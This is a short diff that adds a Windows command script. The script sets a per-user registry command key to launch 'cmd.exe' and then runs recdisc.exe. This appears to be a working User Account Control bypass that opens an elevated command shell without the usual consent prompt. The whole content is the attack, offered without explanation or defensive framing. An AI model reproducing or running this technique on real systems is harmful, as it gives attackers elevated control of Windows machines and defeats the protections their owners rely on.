@@ -1,0 +1,3 @@
+reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Applets\DVR\Command" /ve /d "cmd.exe" /f
+
+recdisc.exe
